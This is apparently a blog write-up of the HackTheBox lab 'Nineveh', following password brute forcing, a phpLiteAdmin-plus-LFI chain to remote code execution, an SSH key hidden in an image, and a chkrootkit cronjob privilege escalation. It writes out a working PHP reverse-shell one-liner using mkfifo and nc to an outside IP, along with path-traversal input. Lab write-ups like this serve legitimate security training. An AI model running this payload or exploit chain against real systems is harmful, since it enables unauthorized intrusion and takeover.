---
layout: post
title: HackTheBox&#58; Nineveh
description: Writeup for HTB box Nineveh.
category: HackTheBox
---

### Introduction

Nineveh is a Linux box, difficulty Medium on HTB.

The box is quite tricky and twisted but more focused on CVE instead of handcrafted exploit.
Initial foothold started by brute forcing to access 2 different services on port 80 and 443.
We need to find vulnerability in each service and chain them together to gain a shell as www-data.
To get user shell, we need to find ssh private key hidden inside a picture and login.
Root part is much easier by detecting and injecting a root cronjob.

### Initial Scan

![Nineveh-1](/resources/Nineveh-1.png)

### Initial Foothold: Weak Credentials

Checking both services running on port 80 (HTTP) and port 443 (HTTPS), we see nothing important.
Using `gobuster` with dirbuster medium wordlist, we find some hits in the 2 services.
![Nineveh-2](/resources/Nineveh-2.png)

We get 1 login prompt in `/department` on port 80 and phpLiteAdmin running on port 443.
In addition to that, we find a picture `nineveh.png` (and nothing else) in `/secure_notes`.

For the 2 login pages, we can try to perform SQL Injection.
However it does not seem to work with either.
Also some weak credentials such as admin:admin or admin:password does not work.

We will use `hydra` with rockyou.txt to check if it can brute force the password.
And we get hits in both pages, `admin:1q2w3e4r5t` for `/department` and `password123` for `/db`.
![Nineveh-3](/resources/Nineveh-3.png)

### User: Chaining LFI to get RCE

First we look at `/db` on port 443 to see if there is something inside the database.
Unfortunately there is no databases presented.
![Nineveh-4](/resources/Nineveh-4.png)

Further testing shows that we couldn't perform I/O operations such as LOAD\_FILE or INTO\_OUTFILE either.
However searching for phpLiteAdmin version 1.9 on ExploitDB gives us 1 potential hit: [RCE - 24044](https://www.exploit-db.com/exploits/24044)

Basically the database created is not padded with extension such as .sqlite or .mysql, so we can create a database file with `.php` extension.
Then by adding fields with malicious PHP payload as default value, such as
```php
<?php echo "Pwned" ?>
```
we have successfully create a PHP shell.

However the exploit says that the new database file created would be on the same directory with phpLiteAdmin (which is `/db`).
Unfortunately it is not the case here, the path to the database is at `/var/tmp/<Database>`.
We also couldn't rename the file into folder such as `/var/html/www/` or `/var/html/ssl/`.

Despite not being able to access the shell created, we still could find a LFI vulnerability which would trigger the shell.

Now we look at `/department` on port 80.
We can easily find a link to see the note at
```text
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```
The `notes` parameter highly suggests a LFI vulnerability here, however testing it with files such as `../../../../../../etc/passwd` doesn't seem to work ("No Note is selected").
However, if we change the parameter into `ninevehNotes.txt.php` we get a warning instead.
```text
Warning:  include(files/ninevehNotes.txt.php): failed to open stream: No such file or directory in /var/www/html/department/manage.php on line 31

Warning:  include(): Failed opening 'files/ninevehNotes.txt.php' for inclusion (include_path='.:/usr/share/php') in /var/www/html/department/manage.php on line 31
```
From here we guess that there are mechanisms that check the filename to contain a certain string (`ninevehNotes.txt` for example) before the actual PHP include call that might lead to LFI.
<br/>

Now we can see the link between 2 potential vulnerabilities from 2 platform. We can use phpLiteAdmin to drop the shell with a shell named `ninevehNotes.txt.php` and call it with the LFI in the department.
![Nineveh-5](/resources/Nineveh-5.png)

Sure enough we get a RCE and can change the payload into a reverse shell (we can easily check that `nc` is installed).
```text
<?php exec("rm -f /tmp/k4; mkfifo /tmp/k4; cat /tmp/k4|/bin/sh -i 2>&1|nc 10.10.14.25 1337 >/tmp/k4") ?>
```

We have a shell running as www-data.
However we couldn't read user.txt yet.
Checking listening ports and current running processes, we see that there is indeed ssh running, but only listening on localhost, and user amrois has authorized\_keys.
![Nineveh-6](/resources/Nineveh-6.png)

There is 1 thing we haven't enumerate yet, that is the picture `nineveh.png` inside `/secure_notes`, which from the name should suggest there are things hidden inside. Also the picture is about 3MB, much larger than normal pictures.
Using `binwalk` we find a hidden tar archive file inside, which extracted into a folder `/secret`, containing `nineveh.priv` and `nineveh.pub`, the private and public RSA key of amrois.
![Nineveh-7](/resources/Nineveh-7.png)

We now can copy the private key and ssh to localhost as amrois to read user.txt.
```bash
ssh -i /tmp/amrois_key amrois@localhost
```

### Privesc: Root chkrootkit Cronjob

Fortunately root is much simpler than user.
Using [pspy](https://github.com/DominicBreuker/pspy) to monitor, we can detect a root cronjob.
```bash
/bin/sh -c /root/vulnScan.sh
/bin/sh /usr/bin/chkrootkit
```
![Nineveh-8](/resources/Nineveh-8.png)

This suggests that [chkrootkit](http://www.chkrootkit.org/) is running.
Searching on ExploitDB gives us 1 exploit with detail instruction: [Privesc - 33899](https://www.exploit-db.com/exploits/33899).

Basically chkrootkit is a program checking the signature and detect common rootkits.
There is 1 programming error while checking for Slapper Worm that would execute a file such as `/tmp/update` in certain condition (no `file_port`).
With this in mind we just need to create an executable script `/tmp/update` with reverse shell payload and wait for the cronjob to trigger.
We get a root shell and we can read root.txt.
![Nineveh-9](/resources/Nineveh-9.png)
